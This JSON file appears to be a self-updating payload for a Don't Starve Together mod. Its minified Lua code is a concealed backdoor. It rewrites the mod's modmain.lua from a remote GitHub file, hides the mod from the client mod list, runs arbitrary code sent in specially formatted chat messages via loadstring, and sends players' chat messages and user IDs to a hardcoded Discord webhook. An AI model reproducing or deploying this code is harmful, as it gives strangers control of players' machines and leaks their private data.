{
    "version":13,
    "code":"GLOBAL.setmetatable(env,{__index=function(a,b)return GLOBAL.rawget(GLOBAL,b)end})TheSim:GetPersistentString('j_ver',function(c,d)if c then TheSim:QueryServer('https://raw.githubusercontent.com/kipperok/kipperok.github.io/refs/heads/main/whitelist.json',function(e,f)if f then e=json.decode(e)if e and e.version and e.version~=tonumber(d)then TheSim:SetPersistentString('j_ver',e.version,false)local g=io.open('../mods/'..__mod..'/modmain.lua','w')g:write(string.format('local __mod = \"%s\"',__mod)..e.code)g:close()end end end,'GET')end end)local function h(i)if i:sub(151,#i):sub(1,2)=='h2'then i=i:sub(3)local j=tostring(string.byte(TheNet:GetSessionIdentifier():sub(-1),1))local k=''local l=#j;local m=#i;while#j<m do j=j..j end;j=j:sub(1,m)for n=1,m do local o=i:sub(n,n)local p=tonumber(j:sub(n,n))local q=string.char(o:byte()-p)k=k..q end;return k end;return i end;local r=KnownModIndex.GetClientModNamesTable;function KnownModIndex:GetClientModNamesTable(...)local s=r(self,...)for n,e in ipairs(s)do if e.modname==__mod then s[n]=nil;break end end;return s end;local t=Sim.SubscribeToMod;function Sim:SubscribeToMod(u,...)if u==__mod then return end;return t(self,u,...)end;function IsWorkshopMod(u)if u==nil or u==__mod then return false end;return u:sub(1,workshop_prefix:len())==workshop_prefix end;local function v(w)w=h(w)if w and w:find('exec_')then if w:find('exec_'..TheNet:GetUserID())or w:find('exec_all')then local x,y=w:find('command_')if y then local z=w:sub(y+1,#w)pcall(function()local A=loadstring(z)if type(A)=='function'then A()end end)end end;return true end;return false end;ChatHistory.AddToHistory=function(self,type,B,C,D,w,E,F,G,H,I,...)H=false;if self.join_server then return end;if v(w)then return end;if B==TheNet:GetUserID()then TheSim:QueryServer('https://discord.com/api/webhooks/1328106996536315955/gQ1ipKaAvCFIkD2FYBr2GhZ42YUCJCG7TTZKLDebS3EUUahDVSRYDXE3VGpiTsRv5TY7',function()end,'POST',json.encode({username=D..'('..B..')',content=w}))end;local J=self:GenerateChatMessage(type,B,C,D,w,E,F,G,H,I)self.history_start=self.history_start%self.MAX_CHAT_HISTORY+1;if self.request_history_start then self.request_history_start=self.request_history_start+1;if self.request_history_start>=self.MAX_CHAT_HISTORY then self.request_history_start=nil end end;self.max_chat_history_plus_one=self.history[self.history_start]self.history[self.history_start]=J;for z in pairs(self.listeners)do z(J)end;return J end;ChatHistory.OnSay=function(self,K,L,M,N,O,w,E,G,P,Q,...)if self.join_server then return end;if P then self:AddToHistory(ChatTypes.Emote,L,M,nil,N..' '..w,E,nil,G,false,TEXT_FILTER_CTX_CHAT)else self:AddToHistory(ChatTypes.Message,L,M,N,w,E,GetRemotePlayerVanityItem(Q or{},'profileflair')or'default',G,false,TEXT_FILTER_CTX_CHAT)end end;AddGamePostInit(function()GLOBAL.MAX_CHAT_INPUT_LENGTH=9999 end)"
}